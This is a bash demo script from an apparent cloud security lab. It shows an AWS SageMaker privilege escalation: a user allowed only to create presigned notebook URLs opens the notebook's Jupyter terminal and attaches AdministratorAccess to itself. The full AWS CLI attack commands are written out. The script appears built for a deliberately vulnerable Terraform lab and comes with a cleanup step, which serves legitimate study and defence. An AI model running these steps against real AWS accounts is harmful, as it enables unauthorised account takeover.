#!/bin/bash

# Demo script for SageMaker CreatePresignedNotebookInstanceUrl privilege escalation
# This scenario demonstrates how a user with CreatePresignedNotebookInstanceUrl can
# generate a presigned URL to access an existing notebook with an admin role and
# execute commands with elevated privileges via the Jupyter terminal.


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-sagemaker-004-to-admin-starting-user"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}SageMaker CreatePresignedNotebookInstanceUrl Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_sagemaker_004_sagemaker_createpresignednotebookinstanceurl.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
NOTEBOOK_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.notebook_instance_name')
NOTEBOOK_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.notebook_execution_role_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Target notebook: $NOTEBOOK_NAME"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Discover and describe target notebook
echo -e "${YELLOW}Step 5: Discovering target SageMaker notebook instance${NC}"
use_readonly_creds
echo "Listing notebook instances..."
show_cmd "ReadOnly" "aws sagemaker list-notebook-instances --region $AWS_REGION --output table"
aws sagemaker list-notebook-instances --region $AWS_REGION --output table

echo ""
echo "Describing target notebook: $NOTEBOOK_NAME"
show_cmd "ReadOnly" "aws sagemaker describe-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION --output json"
NOTEBOOK_INFO=$(aws sagemaker describe-notebook-instance \
    --notebook-instance-name $NOTEBOOK_NAME \
    --region $AWS_REGION \
    --output json)

NOTEBOOK_STATUS=$(echo $NOTEBOOK_INFO | jq -r '.NotebookInstanceStatus')
NOTEBOOK_ROLE=$(echo $NOTEBOOK_INFO | jq -r '.RoleArn')

echo "Notebook status: $NOTEBOOK_STATUS"
echo "Notebook execution role: $NOTEBOOK_ROLE"
echo ""

echo "Verifying the notebook's execution role has admin permissions..."
show_cmd "ReadOnly" "aws iam get-role --role-name $NOTEBOOK_ROLE_NAME --query \"Role.{RoleName:RoleName,Arn:Arn}\" --output table"
aws iam get-role --role-name $NOTEBOOK_ROLE_NAME --query 'Role.{RoleName:RoleName,Arn:Arn}' --output table
echo ""
# echo "Checking attached policies..."
# aws iam list-attached-role-policies --role-name $NOTEBOOK_ROLE_NAME --output table

echo -e "${GREEN}✓ Target notebook found with admin execution role${NC}\n"

# [EXPLOIT] Step 6: Wait for notebook to be InService if not already
echo -e "${YELLOW}Step 6: Ensuring notebook is in InService state${NC}"
use_starting_creds
echo "Current status: $NOTEBOOK_STATUS"

# If notebook is not InService, wait for it
if [ "$NOTEBOOK_STATUS" != "InService" ]; then
    echo "Notebook is not InService. Waiting for it to reach InService state..."

    # If stopped, start it
    if [ "$NOTEBOOK_STATUS" == "Stopped" ]; then
        echo "Starting notebook instance: $NOTEBOOK_NAME"
        show_attack_cmd "Attacker" "aws sagemaker start-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION"
        aws sagemaker start-notebook-instance \
            --notebook-instance-name $NOTEBOOK_NAME \
            --region $AWS_REGION
        echo -e "${GREEN}✓ Start command sent${NC}\n"
    fi

    echo "Waiting for notebook to reach InService state (this may take 5-8 minutes)..."
    MAX_WAIT=600  # 10 minutes
    ELAPSED=0
    while [ $ELAPSED -lt $MAX_WAIT ]; do
        use_readonly_creds
        CURRENT_STATUS=$(aws sagemaker describe-notebook-instance \
            --notebook-instance-name $NOTEBOOK_NAME \
            --region $AWS_REGION \
            --query 'NotebookInstanceStatus' \
            --output text)

        echo "  Status: $CURRENT_STATUS (elapsed: ${ELAPSED}s)"

        if [ "$CURRENT_STATUS" == "InService" ]; then
            echo -e "${GREEN}✓ Notebook is now InService${NC}\n"
            break
        fi

        if [ "$CURRENT_STATUS" == "Failed" ]; then
            echo -e "${RED}Error: Notebook is in Failed state${NC}"
            exit 1
        fi

        sleep 15
        ELAPSED=$((ELAPSED + 15))
    done

    if [ "$CURRENT_STATUS" != "InService" ]; then
        echo -e "${RED}Error: Notebook did not reach InService state within timeout${NC}"
        exit 1
    fi
else
    echo "Notebook is already InService"
    echo -e "${GREEN}✓ Notebook is ready${NC}\n"
fi

# [EXPLOIT] Step 7: Generate presigned URL
echo -e "${YELLOW}Step 7: Generating presigned URL for notebook access${NC}"
use_starting_creds
echo "Creating presigned URL for notebook: $NOTEBOOK_NAME"
echo ""

show_attack_cmd "Attacker" "aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION --query 'AuthorizedUrl' --output text"
PRESIGNED_URL=$(aws sagemaker create-presigned-notebook-instance-url \
    --notebook-instance-name $NOTEBOOK_NAME \
    --region $AWS_REGION \
    --query 'AuthorizedUrl' \
    --output text)

echo -e "${GREEN}✓ Presigned URL generated successfully${NC}\n"

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}PRESIGNED URL (valid for 12 hours):${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""
echo -e "${YELLOW}$PRESIGNED_URL${NC}"
echo ""
echo -e "${BLUE}========================================${NC}\n"

# Step 8: Provide instructions for manual browser access
echo -e "${YELLOW}Step 8: Access the notebook via your web browser${NC}"
echo ""
echo -e "${YELLOW}MANUAL STEP REQUIRED:${NC}"
echo "1. Copy the presigned URL above"
echo "2. Open it in your web browser"
echo "3. Wait for Jupyter to load (may take 30-60 seconds)"
echo "4. Once in Jupyter, click 'New' → 'Terminal' to open a terminal"
echo "5. In the terminal, execute the following command:"
echo ""
echo -e "${GREEN}aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess${NC}"
echo ""
echo "6. The command will execute with the notebook's admin role credentials"
echo "7. Press ENTER in this terminal when you've completed the above steps"
echo ""
read -p "Press ENTER after executing the command in Jupyter terminal..."
echo ""

# Step 9: Wait for IAM policy propagation
echo -e "${YELLOW}Step 9: Waiting for IAM policy changes to propagate${NC}"
echo "Waiting 15 seconds for IAM policy propagation..."
sleep 15
echo -e "${GREEN}✓ Policy changes should now be effective${NC}\n"

# [OBSERVATION] Step 10: Verify administrator access
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
use_readonly_creds
echo "Testing if we now have admin permissions..."
echo "Attempting to list IAM users..."

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo -e "${YELLOW}Note: IAM policy changes can take a few seconds to propagate${NC}"
    echo -e "${YELLOW}Or you may not have executed the command in Jupyter terminal yet${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (sagemaker:CreatePresignedNotebookInstanceUrl)"
echo "2. Discovered target notebook: $NOTEBOOK_NAME (with admin execution role)"
echo "3. Waited for notebook to be InService"
echo "4. Generated presigned URL for notebook access"
echo "5. Accessed Jupyter notebook via presigned URL in browser"
echo "6. Opened terminal in Jupyter (which has admin role credentials)"
echo "7. Executed AWS CLI command to grant AdministratorAccess to starting user"
echo "8. Achieved: Full administrator access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → CreatePresignedNotebookInstanceUrl"
echo "  → Access Jupyter Terminal (with admin role credentials)"
echo "  → AttachUserPolicy → Admin Access"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- AdministratorAccess policy attached to: $STARTING_USER"
echo "- Presigned URL generated (expires in 12 hours)"

echo -e "\n${RED}⚠ Warning: AdministratorAccess policy attached to starting user${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
